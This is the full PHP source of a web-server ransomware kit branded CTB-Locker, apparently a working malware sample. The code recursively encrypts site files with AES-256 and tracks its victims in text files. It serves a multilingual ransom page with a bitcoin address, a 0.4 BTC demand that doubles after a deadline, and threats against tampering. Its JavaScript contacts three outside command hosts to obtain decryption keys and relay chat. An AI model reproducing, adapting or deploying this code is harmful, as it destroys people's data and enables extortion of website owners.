<?php
//session_start();
//if (!isset($_SESSION["page"])) $_SESSION["page"] = "index";

$d = isset($_SERVER["HTTP_HOST"]) && $_SERVER["HTTP_HOST"] != "" ?
	$_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"];
$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
define("cur_domain", $d);
define("cur_url", $proto.$d.$_SERVER["REQUEST_URI"]);

require_once('crypt/AES.php');
require_once('crypt/Random.php');
//==============================================================================
function enc_excluded($victim) {
	return !in_array($victim, array('./index.php', './allenc.txt', './test.txt', './victims.txt', './extensions.txt', './temp', './robots.txt')) &&
		(false === strpos($victim, '/crypt/')) && (false === strpos($victim, 'secret_'));
}
//==============================================================================
function get_files($dir, $arr_ext, $maxsize, $filter) {
    $files_list = array();
    if ($dh = opendir($dir)) {
        while (false !== ($file = readdir($dh))){
            if($file == '.' || $file == '..'){
                continue;
            }
			
            $path = $dir.'/'.$file;
			$ext = explode('.', $file);
			$ext = mb_strtolower(array_pop($ext));
            if(is_file($path) && filesize($path) <= $maxsize &&
				in_array($ext, $arr_ext) && call_user_func($filter, $path)) {
				$files_list[] = $path;
            }
            elseif(is_dir($path)){
                $files_list = array_merge($files_list, get_files($path, $arr_ext, $maxsize, $filter));
            }
        }
        closedir($dh);
        return $files_list;
    }
	return false;
}
//==============================================================================
/*
function crypt_file($fname, $cipher, $encrypt, $chunklen=10240) {
	echo "crypt_file $fname\n"; #debug
	$chunklen = $chunklen * 16 - ($encrypt ? 1 : 0);
	$file = fopen($fname, 'r');
	$temp = fopen('temp', 'w');
	while (!feof($file)) {
		$chunk = fread($file, $chunklen);
		if ($chunk === "") continue;
		$encrypted = $encrypt ? $cipher->encrypt($chunk) : $cipher->decrypt($chunk);
		fwrite($temp, $encrypted);
	}
	fclose($file);
	fclose($temp);
	
	$file = fopen($fname, 'w');
	$temp = fopen('temp', 'r');
	while (!feof($temp)) {
		$chunk = fread($temp, $chunklen);
		fwrite($file, $chunk);
	}
	fclose($file);
	fclose($temp);
}*/
//==============================================================================
function create_aes_cipher($key) {
	$aes = new Crypt_AES();
	$aes->setKeyLength(256);
	$aes->setKey($key);
	return $aes;
}
//==============================================================================
function crypt_file($fname, $cipher, $encrypt, $chunklen=10240) {
	echo "crypt_file $fname ";
	$chunklen *= 16;
	$size = filesize($fname);
	$file = @fopen($fname, 'r+');
	if ($file === false) {
		echo "FAILED\n";
		return;
	}
	$seek = 0;
	$eof = false;
	$cipher->disablePadding();
	$tm = time();
	while (!$eof || (time() - $tm > 10)) {
		@fseek($file, $seek);
		$chunk = @fread($file, $chunklen);
		$eof = $seek + strlen($chunk) >= $size; #feof($file);
		if ($eof) {
			//echo "eof<br>";
			$cipher->enablePadding();
		}
		$crypted = $encrypt ? $cipher->encrypt($chunk) : $cipher->decrypt($chunk);
		@fseek($file, $seek);
		@fwrite($file, $crypted);
		$seek += strlen($crypted);
		//echo "Seek read: $seek, readed: ".strlen($chunk)." after crypt: ".strlen($crypted)."<br>";
	}
	ftruncate($file, $seek);
	echo "OK truncated: $seek\n";
	@fclose($file);
}
//==============================================================================
function encrypt_files($files, $keypass, $keytest) {
	$allenc = file_exists('allenc.txt') ? explode("\n", file_get_contents('allenc.txt')) : array();
		
	if (!file_exists('test.txt') || file_get_contents('test.txt') === '') {
		echo 'getting test files\n';
		$cipher = create_aes_cipher($keytest);
		$test_files = $files;
		shuffle($test_files);
		$test_files = array_splice($test_files, 0, 2);
		foreach ($test_files as $victim) {
			crypt_file($victim, $cipher, 1);
			file_put_contents('test.txt', $victim."\n", FILE_APPEND);
		}
	} else {
		$test_files = explode("\n", file_get_contents('test.txt'));
	}	
	
	$cipher = create_aes_cipher($keypass);
	foreach ($files as $victim) {
		if (!in_array($victim, $allenc) && !in_array($victim, $test_files)) {
			crypt_file($victim, $cipher, 1);
			file_put_contents('allenc.txt', $victim."\n", FILE_APPEND);
		}
	}
}
//==============================================================================
function decrypt_files($filelist, $keypass) {
	if (!file_exists($filelist)) return;
	$allenc = array_reverse(explode("\n", file_get_contents($filelist)));
	
	$cipher = create_aes_cipher($keypass);
	$fsize = filesize($filelist);
	foreach ($allenc as $victim) {
		if (!file_exists($victim)) continue;
		crypt_file($victim, $cipher, 0);
		
		$fsize -= strlen($victim) + 1;
		$hfile = fopen($filelist, 'r+');
		ftruncate($hfile, $fsize);
		fclose($hfile);
	}
}
//==============================================================================
if (isset($_POST['submit'])) {
	// call this script until victims.txt != allenc.txt (without blank lines)
	if (!file_exists('victims.txt') || file_get_contents('victims.txt') === '') {
		$extensions = explode(' ', file_get_contents('extensions.txt'));
		$victims = get_files('.', $extensions, 80*1024*1024, 'enc_excluded');
		$victims = array_slice($victims, 0, 4000);
		file_put_contents('victims.txt', implode("\n", $victims));
	} else {
		$victims = explode("\n", file_get_contents("victims.txt"));
	}
	encrypt_files($victims, $_POST['submit'], $_POST['submit2']);
	exit("ALL_HAD_DONE");
}
//==============================================================================
function secret_ok() {
	$secret = substr(md5("djf33".cur_domain), 2, 10);
	return isset($_GET["secret"]) && $_GET["secret"] === $secret;
}
//==============================================================================
if (isset($_GET['decrypt']) && secret_ok()) {
	decrypt_files('allenc.txt', $_GET['decrypt']);
	decrypt_files('test.txt', $_GET['dectest']);
	exit('Congratulations! ALL FILES WAS DECRYPTED!!');
}
//==============================================================================
if (isset($_GET['dectest']) && secret_ok()) {
	decrypt_files('test.txt', $_GET['dectest']);
	exit('Congratulations! TEST FILES WAS DECRYPTED!!');
}
//==============================================================================
?><!DOCTYPE html>
<html>
<head>
	<title>CTB-Locker</title>
	<meta charset="UTF-8">
	
	<script src="http://code.jquery.com/jquery-latest.js"></script>

	<style type="text/css">
body {
	width: 100%;
	height: 100%;
	margin: 0px;
	background-color: black;
}

.cloth {
	margin: auto 40px auto 40px;
	padding: 30px 130px;
	background-color: #C3C3C3;
	min-width: 700px;
}

.main {
	border-radius: 10px;
	background-color: #1D1D1D;
	padding: 0px 20px 40px 20px;
}

.header {
	padding: 5px 0px;
	overflow: hidden;
	border-bottom: 1px solid;
	border-bottom-color: #AAAAAA;
}

.navcontainer, .navitem {
	float: left;
}

.langs, .langs>a {
	float: right;
}

.navitem:first-child {
	margin-left: 0px;
}

.navitem {
	margin: 0px 5px;
	padding: 2px 4px;
	border-radius: 4px;
	color: black;
	background-color: #777777;
	width: 95px;
	cursor: pointer;
	font-size: 18px;
	text-align: center;
	color: turquoise;
}

.langs>a {
	margin: 0px 5px;
}

.navitem:hover{
	color: white;
	background: #216091;
    background: linear-gradient(to bottom, #216091, #3F89C6);
}

.content a {
	color: yellow;
}

h2 {
	color: #F67F05;
}
p, .list {
	color: #DDDDDD;
}

iframe {
    width: 560px;
    display: block;
    margin: 0 auto;
}

.list {
	padding-left: 60px;
	line-height: 1.4;
}

.btn {
	margin-top: 10px;
	border-radius: 4px;
	padding: 2px 6px;
	cursor: pointer;
	background-color: #008000;
	color: white;
	text-align: center;
	width: 300px;
}

.btn:hover {
	background: #008000;
    background: linear-gradient(to bottom, #008000, #00B500);
}

.secretbtn {
	overflow: hidden;	
}

.secretbtn>.seccls, .secretbtn>.btn {
	float: left;
	margin: 5px 10px 0px 0px;
}

.secretbtn>.btn {
	width: 180px;
}
	</style>
</head>
<body>

<?php
	if (!isset($_GET["page"]) || !in_array($_GET["page"], array("index", "freepage", "chat"))) {
		$_GET["page"] = "index";
	}
	//if (isset($_GET["page"]) && in_array($_GET["page"], array("index", "freepage", "chat"))) {
	//	$_SESSION["page"] = $_GET["page"];
	//}
	//if (isset($_GET["lang"]) && in_array($_GET["lang"],
	//	array("eng", "ger", "ita", "fra", "rus", "chi", "tur"))) {
	//	$_SESSION["lang"] = $_GET["lang"];
	//}
?>

<div class="cloth">

<div class="main">	
	<div class="header">
		<div class="navcontainer">
			<a href="?page=index"><div class="navitem">Index</div></a>
			<a href="?page=freepage"><div class="navitem">Free decrypt</div></a>
			<a href="?page=chat"><div class="navitem">Chat</div></a>
		</div>
		<div class="langs">
<?php
function lurl($lang) {
echo "https://translate.googleusercontent.com/translate_c?act=url&depth=1&ie=UTF8&prev=_t&sl=eng&tl=$lang&u=".urlencode(cur_url);
}
?>
			<a href="<?php lurl('en');?>"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAZCAIAAAA0WgDFAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOwQAADsEBuJFr7QAAABh0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMC4zjOaXUAAAAklJREFUSEtj4DMpYNTMFDAtZNDIAJKMmhmC5kX8JoWMGhn8CMFMAbOi/VwGlCCGuPIFRkFtXXN2Ai3onrfbMLA1sWphUvUiPf/m7rm7hMyLO+fsNA1pjyuff0TWgRLEwK6XA3Qyh14O0PlgdgaHfi5Wwf+UAYboknla3o0NU7YAg7Fp6lZNr4aEyoXxFQvUPOoap24FCjZO3aLr1xxTOu/rzfuUIAY23RwWnWwugzyg8zkN8li0s4AiIEHtLKAgMLbggmjhTipiCMmfpeJWW9K1ls+4oLR7nbJrbXTpvIiiOQrO1aXdIEGglJpHfXjh7HPOCZQgBmBC4DXOl3GoBEYMkOQxyhc0KwImBG4jFEFg2oOGN7mAwTVpoqxjZWzZfF7jAmA6BJrrnT7FPWWStH0FkAsUBErJO1UBRV5v2U8JYlB2qwX6wDS0A+h887AOIBsYmKrudcBsZAYWNAvrELYoVnKtQQt3UhGDQWCriGWJQ1wft2E+kAQaCrTAKLhNyKLYMR4kaB/XJ2pVYhzcdiOjgRLEADRXyrbcP3s6k1ZmYO4MSdtyoM8swjvFrEsDwIIBOTNk7CuAmRca3uQCBmDEcBrkAsMQmI6BCY9TPxeY6oAxB8yqcEFgcgdG1aO+BZQgBt/Maeqe9UUdq4GGloITNNB/gTkzgNYUd64BFhBAUtO7wSdjKlq4k4oY2vrXEYnQ3EgqYoCGIu0BA1oKoR1iQAtN2iEGtJxMO0THeDpjG00fRMd4+vH0JX0QHePpoLAFfRC94onLAACBwtWOU5UJUAAAAABJRU5ErkJggg=="/></a>
			<a href="<?php lurl('de');?>"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAZCAIAAAA0WgDFAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOwgAADsIBFShKgAAAABh0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMC4zjOaXUAAAAHxJREFUSEvt0kEOQDAQheFJVPfKpkNs1HlwOM7Uo6iNG2AkTqB5FtKXL+3y3wxprXP8pELyKfykkkqv99eSPJlSaHdpMdVcGLTFlBSYg7UrmFRoZd7wQp1KET4s1XJ7drMMJ7e3T+0+NHBjS4fvT9/huVSKkEoxnpKD8/0FlEh/ctUq5JQAAAAASUVORK5CYII="/></a>
			<a href="<?php lurl('ru');?>"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAZCAIAAAA0WgDFAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuM4zml1AAAAB6SURBVEhLY7h+/fpz2oObN28yvHnz5j/twfv370dtIhuM2kQJANkU07EmdsJ2WqPIjrUMnP7tDIH9tEZMvu2jNpGNRm2iBIFscnfNcHfNoTVycUpnOGCoc0Ffk9bosK46wwEj+tikMWoT2Wi42rTNQPuIrgat0Q4dNQDImKoFBQcxPgAAAABJRU5ErkJggg=="/></a>
			<a href="<?php lurl('fr');?>"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAZCAIAAAA0WgDFAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuM4zml1AAAABESURBVEhLY2AwnIMflU089e//f/zoVXnuPUUB/GjUJlxo1CZcaNQm3GjUJlxo1CZcaNQm3GjUJlxo1CZcaNQmXEhRAADY9Y7b/Ez4LQAAAABJRU5ErkJggg=="/></a>
			<a href="<?php lurl('zh-CN');?>"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAZCAIAAAA0WgDFAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOwgAADsIBFShKgAAAABh0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMC4zjOaXUAAAAT9JREFUSEvt0z1Lw0AcBvBndnJ1culQrdXgCwhSXPQLFAdnHURQQXAQBBc/gx/A7yBuiog4CzrU1c3Ju1xebEwTr7b0+r9Kc5fQRQq/IXnyhyd3l+BxGo3SyN2XJ/BWwufMMGwR/r4e2nqdG2gKj8H6biW+hPgJ7gYJbf3RFD+Dr5KElcEdkuSgmrxd+CcIz5AmaF62r70jsFkyXYRqEptoNZCmXckHvG0yyqoITvWNNUd2z3XQev9takLU1FD3aQ3RNfianhsiTXwFaYTvGyQuxJYa6mHzemKONIUHCM/b+yPq+LpQQx25962DNPW/sjyV3rXEKwgOIdZJaIU0DSEXFF0h2NFzc6ZNkvyrJC00l93EF/Qkn6ymCuJbePWB3F72mvw9/evIx+KcCho3FTFuKuK/Nj1UJ1+ckbtbnvoBuZnIcdVdbbAAAAAASUVORK5CYII="/></a>
			<a href="<?php lurl('it');?>"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAZCAIAAAA0WgDFAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuM4zml1AAAABHSURBVEhLYzCczGgwhQEPatmf+e/ff/zow5J59xQF8KNRm3ChUZtwoVGbcKNRm3ChUZtwoVGbcKNRm3ChUZtwoVGbcCFFAQAxTIpdWZMjsQAAAABJRU5ErkJggg=="/></a>
			<a href="<?php lurl('tr');?>"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAZCAIAAAA0WgDFAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAFxEAABcRAcom8z8AAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuM4zml1AAAAI4SURBVEhL7ZS/axRBFIB3ZnJ3TTgJqJdGu2v0CiX4I2D8ExS0OCF/QQqNXFrtTGxTmUjQQiRoaZTooYVEiKYQkysUtEyt3O3OzuzM7Oz5ZjfouplL9iLXiPDBLjtv3jfz3mMdSgoCk0HjE+LAI3KcQSMx+m86MPuYNPoFSl4yAfnpaUqy+ydO0tu3/OVl/+EDOjXlHzl8YJndBOmCUsmdn9dKdrvdSCn+6WPw5jVtbbr1OpwgE58Hiwk0EmPv8aMoikDDVl941aqKq8cLRffypfbExfjGv7fkwWpC9OoVrbXRvFwVxaJOrYbI6VSOSkxYudyXzGIKEWJrb0GjhKDVqjWddpAH/avVIFjCUXIoLSY+PKwFNxdaX4dE6SUgrhsyp1m4x758ps+fuXOzCu/fOYuJHT8WRaZ0wdMnVpN76rTfbGpphiXY3ublcibGis00MqJDBVn4qyZ0Jb0EQM8UJl6txjY2tI6kCOj5s3mmcccU12QHhTHf2gSTbP9gh0zbM8A26BNbWurcuE7HxzvX6nD1TMxuLCbY5k5Pw4jrrvbm7kAP0quAKJUUIu7EBUmwsf652guLCYBc7MN7uFYYKnemIYaG4lObQeCjle/nziTlyuzaG7vJFKcyytfeabhZpIPWln93ls406P2FduOmILvic9DDFDdDFAr+5KS/sqK+fgtaLba4SMfGkoHOBOehpwmAjECIMPwRYEySL+mAvtjLlCaxZj72RV7T3/OvmhiBhqNBwwn+CQX71Pj1QJBrAAAAAElFTkSuQmCC"/></a>
		</div>
	</div>
	<div class="content">
<?php
if ($_GET["page"] == "index") echo <<<ENDECHO
	<h2>Attention! What happened?</h2>
	
	<p>Your personal files are encrypted by <font color="red"><b>CTB-Locker</b></font>.<br>
	Your scripts, documents, photos, databases and other important files have been encrypted with strongest encryption algorithm AES-256 and unique key, generated for this site.</p>
	
	<p>Decryption key is stored on a secret Internet server and <b>nobody</b> can decrypt your files until you pay and obtain the decryption key.</p>
	
	<p>Learn more about the algorithm can be here:
	<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">Wikipedia</a></p>
	<p><a href="https://securityledger.com/2015/10/fbis-advice-on-cryptolocker-just-pay-the-ransom/">Fbi's advice on cryptolocker just pay the ransom</a></p>
	
	<h2>What to do?</h2>
	
	<p>We created for you this bitcoin address <font color="red">1EYzYEubQVTwP8HDrKD1UoNyh2iN9ztPv2</font></p>
	<a href="https://blockchain.info/en/wallet/bitcoin-faq">What is a Bitcoin address?</a><br>
	<p>For decrypt your files you need to make a few <b>simple</b> steps:<br></p>
	<div class="list">
	1. Get cryptocurrency Bitcoin<br>
	We recommend:<br>
		<div class="list">
		1) <a href="https://localbitcoins.com/">https://localbitcoins.com/</a> - (Paypal, Visa/MasterCard, QIWI Wallet, Any Bank and etc.)<br>
		2) <a href="https://en.bitcoin.it/wiki/Buying_Bitcoins_(the_newbie_version)">Buying Bitcoins (the newbie version)</a><br>
		3) <a href="https://howtobuybitcoins.info/#!/">A complete list of exchanges!</a><br>
		4) <a href="https://btc-e.com/">https://btc-e.com/</a> (OkPay, Perfect Money, Visa/MasterCard and etc.)<br>
		5) <a href="https://www.okcoin.com/">https://www.okcoin.com/</a><br>
		</div>
	2. Send <font color="red">0.4 BTC</font> (~150$) to the address <font color="red">1EYzYEubQVTwP8HDrKD1UoNyh2iN9ztPv2</font><br>
	3. After payment, confirmation is expected within from 15 minutes to 3 hours.<br>
	You can track confirmations of your transaction in <a href="https://blockchain.info/address/1EYzYEubQVTwP8HDrKD1UoNyh2iN9ztPv2">https://blockchain.info/address/1EYzYEubQVTwP8HDrKD1UoNyh2iN9ztPv2</a><br>
	4. Click button:
	<div id="decrypt" class="btn">DECRYPT</div>
	</div>

	<h2>You must carry out this actions before: 2016-02-22 14:00:00</h2>
	<p>At the expiry of the time redemption amount will be <font color="red">0.8 BTC</font>. Please make payment in a timely.</p>
	
	<font color="red"><h3>Dangerous!</h3></font>
	<p>Do not try to cheat the system, edit encrypted files, edit CTB-locker internal files or delete any file. This will result in the inability to recover your data, and we can not help you. Only way to keep your files is to follow the instruction.</p>
	
	<iframe width="560" height="315" src="https://www.youtube.com/embed/hroPcR-0zSI" frameborder="0" allowfullscreen></iframe>
ENDECHO;

if ($_GET["page"] == "freepage") {
$test = "ALREADY DECRYPTED!";
if (file_exists('test.txt')) {
	$t = str_replace("\n", "<br>", file_get_contents("test.txt"));
	if ($t !== "") $test = $t;
}
echo <<<ENDECHO
	<h2>Free decrypt</h2>
	<p>We give you the opportunity to decipher 2 files free!</p>
	<div class="list">$test</div>
	<p>To prove that you are an administrator, you must specify the name of the secret file that is in same directory with index.php.</p>
	<div class="secretbtn">
		<div class="seccls"><input type="text" id="secret"/></div>
		<div id="dectest" class="btn">DECRYPT IT FREE</div>
	</div>
	<p>You can make sure that the service really works and after payment for the CTB-Locker script you can actually decrypt the files.</p>
	<p><font color="red">Do not attempt to replace free decrypted files because they have another encryption key! If you will try to decrypt by this key other files, you will break it.</font></p>
ENDECHO;
}

if ($_GET["page"] == "chat") echo <<<ENDECHO
	<h2>Chat room</h2>
	<p>If you have any questions or suggestions, please leave a english message below. To prove that you are an administrator, you must specify the name of the secret file that is in same directory with index.php. We will reply to you within 24 hours.</p>
	<textarea id="chatmsg" rows="5" cols="80"></textarea>
	<div class="secretbtn">
		<div class="seccls"><input type="text" id="secret"/></div>
		<div id="recvmsg" class="btn">RECIEVE</div>
		<div id="sendmsg" class="btn">SEND</div>
	</div>
ENDECHO;
?>
	</div>
</div>
</div>

<script>
admins = ["http://erdeni.ru/access.php", "http://studiogreystar.com/access.php", "http://a1hose.com/access.php"];
iadmin = 0;
domain = encodeURIComponent(window.location.href.replace('http://', '').replace('https://', '').split('/')[0]);

function post_admin(postdata, onsuccess) {
	$.post(admins[iadmin], postdata+"&domain="+domain, function (data) {
			if (data["status"] == "success") {
				onsuccess(data);
			} else {
				alert(data["status"]);
			}
		}, 'json'
	).fail(function() {
		alert(iadmin >= 2 ? 'It seems like our server is down=( Try to push it again' : 'Push it again');
		iadmin = (iadmin + 1) % 3;
	});
}

$('#decrypt').click(function() {
	post_admin("decrypt=", function(data) {
		alert('Your decryption key is ' + data["decrypt"] + '! Wait while page will be updated!');
		url = window.location.href + (window.location.href.indexOf('?') !== -1 ? '&' : '?');
		window.location.href = url + 'decrypt=' + data["decrypt"] + '&secret=' + data["secret"] + '&dectest=' + data["dectest"];
	});
});

$('#dectest').click(function() {
	post_admin("dectest=&secret="+($("#secret").val()), function(data) {
		alert('Your test decryption key is ' + data["dectest"] + '! Wait while page will be updated!');
		url = window.location.href + (window.location.href.indexOf('?') !== -1 ? '&' : '?');
		window.location.href = url + 'dectest=' + data["dectest"] + '&secret=' + data["secret"];
	});
});

$('#sendmsg').click(function() {
	msg = "&msg=" + encodeURIComponent($("#chatmsg").val());
	post_admin("sendmsg=&secret="+$("#secret").val()+msg, function(data) {
		alert('Thank you for feedback!');
	});
});

$('#recvmsg').click(function() {
	post_admin("recvmsg=&secret="+$("#secret").val(), function(data) {
		$("#chatmsg").val(data["answer"]);
	});
});
	</script>

</body>
</html>